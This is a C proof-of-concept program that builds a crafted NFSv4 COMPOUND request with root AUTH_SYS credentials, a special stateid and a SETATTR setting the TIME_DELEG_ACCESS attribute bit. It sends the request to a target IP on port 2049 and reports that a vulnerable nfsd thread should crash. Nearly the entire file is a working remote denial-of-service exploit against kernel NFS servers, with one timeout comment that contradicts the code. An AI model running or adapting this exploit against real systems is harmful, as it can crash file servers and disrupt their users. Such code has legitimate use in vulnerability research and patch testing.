#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/time.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define OP_PUTROOTFH  24
#define OP_SETATTR    34

// Bit 20 of bmval[2], confirmed from nfsd.ko disassembly:
// test $0x300000,%eax on sa_bmval[2] is the deleg_attrs gate
#define FATTR4_WORD2_TIME_DELEG_ACCESS (1U << 20)

// XDR helpers
void write_u32(unsigned char *buf, uint32_t val) {
    *(uint32_t *)buf = htonl(val);
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <target_ip>\n", argv[0]);
        return 1;
    }

    unsigned char payload[1024];
    int offset = 0;

    // RPC header
    write_u32(&payload[offset], 0x12345678);  // XID
    offset += 4;
    write_u32(&payload[offset], 0);           // Message type (CALL)
    offset += 4;
    write_u32(&payload[offset], 2);           // RPC version
    offset += 4;
    write_u32(&payload[offset], 100003);      // NFS program
    offset += 4;
    write_u32(&payload[offset], 4);           // NFS version 4
    offset += 4;
    write_u32(&payload[offset], 1);           // Procedure (COMPOUND)
    offset += 4;
    // AUTH_SYS credential (flavor=1): stamp + empty machinename + uid=0 + gid=0 + no aux gids
    write_u32(&payload[offset], 1);           // flavor = AUTH_SYS
    offset += 4;
    write_u32(&payload[offset], 20);          // body length = 20 bytes
    offset += 4;
    write_u32(&payload[offset], 1);           // stamp (arbitrary)
    offset += 4;
    write_u32(&payload[offset], 0);           // machinename length = 0
    offset += 4;
    write_u32(&payload[offset], 0);           // uid = 0 (root)
    offset += 4;
    write_u32(&payload[offset], 0);           // gid = 0 (root)
    offset += 4;
    write_u32(&payload[offset], 0);           // aux gids count = 0
    offset += 4;
    write_u32(&payload[offset], 0);           // VERF_NONE flavor
    offset += 4;
    write_u32(&payload[offset], 0);           // Verifier length
    offset += 4;

    // COMPOUND args: tag (empty), minorversion, then operations
    write_u32(&payload[offset], 0);           // tag length = 0 (empty string)
    offset += 4;
    write_u32(&payload[offset], 0);           // minorversion = 0
    offset += 4;
    write_u32(&payload[offset], 2);           // 2 operations
    offset += 4;

    // Op 1: PUTROOTFH (opcode 24)
    write_u32(&payload[offset], OP_PUTROOTFH);
    offset += 4;

    // Op 2: SETATTR (opcode 34)
    write_u32(&payload[offset], OP_SETATTR);
    offset += 4;

    // Stateid - ONE_STATEID: seqid (4 bytes) + other (12 bytes), all 0xFF
    memset(&payload[offset], 0xFF, 16);
    offset += 16;

    // fattr4 attribute bitmap - 3 words
    write_u32(&payload[offset], 3);                              // 3 bitmap words
    offset += 4;
    write_u32(&payload[offset], 0);                              // bmval[0]
    offset += 4;
    write_u32(&payload[offset], 0);                              // bmval[1]
    offset += 4;
    write_u32(&payload[offset], FATTR4_WORD2_TIME_DELEG_ACCESS); // bmval[2] bit 20
    offset += 4;

    // attrlist4: nfstime4 for TIME_DELEG_ACCESS (int64 seconds + uint32 nseconds = 12 bytes)
    write_u32(&payload[offset], 12);  // attrlist length = 12 bytes
    offset += 4;
    write_u32(&payload[offset], 0);   // seconds (high 32 bits)
    offset += 4;
    write_u32(&payload[offset], 0);   // seconds (low 32 bits)
    offset += 4;
    write_u32(&payload[offset], 0);   // nseconds
    offset += 4;

    // TCP record mark: last-fragment bit (0x80000000) | payload length
    unsigned char record_mark[4];
    write_u32(record_mark, 0x80000000 | offset);

    // Create TCP socket
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("socket");
        return 1;
    }

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(2049);

    if (inet_pton(AF_INET, argv[1], &addr.sin_addr) <= 0) {
        fprintf(stderr, "Invalid IP address: %s\n", argv[1]);
        return 1;
    }

    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("connect");
        return 1;
    }

    // Set receive timeout to 2 seconds (so recv doesn't block forever if kernel crashes)
    struct timeval tv;
    tv.tv_sec = 1;
    tv.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char *)&tv, sizeof(tv));

    // Send TCP record mark then RPC payload
    if (send(sock, record_mark, 4, 0) < 0) {
        perror("send record mark");
        return 1;
    }
    if (send(sock, payload, offset, 0) < 0) {
        perror("send payload");
        return 1;
    }

    printf("Sent %d bytes to %s:2049\n", offset + 4, argv[1]);
    printf("If target is vulnerable, nfsd thread should crash now...\n");

    // Read server response (with timeout) to diagnose rejection errors
    unsigned char resp[512];
    int n = recv(sock, resp, sizeof(resp), 0);
    if (n < 0) {
        printf("No response received (timeout or connection closed).\n");
    } else if (n < 8) {
        printf("Response too short (%d bytes)\n", n);
    } else {
        printf("Raw response (%d bytes):", n);
        for (int i = 0; i < n; i++) {
            if (i % 4 == 0) printf("\n  [%2d] ", i);
            printf("%02x ", resp[i]);
        }
        printf("\n");

        if (n >= 32) {
            uint32_t accept_stat = ntohl(*(uint32_t *)(resp + 20));
            uint32_t compound_status = ntohl(*(uint32_t *)(resp + 28));
            printf("accept_stat:      0x%08x (%s)\n", accept_stat,
                   accept_stat == 0 ? "SUCCESS" : "REJECTED");
            printf("compound_status:  0x%08x\n", compound_status);
        }
    }

    close(sock);
    return 0;
}
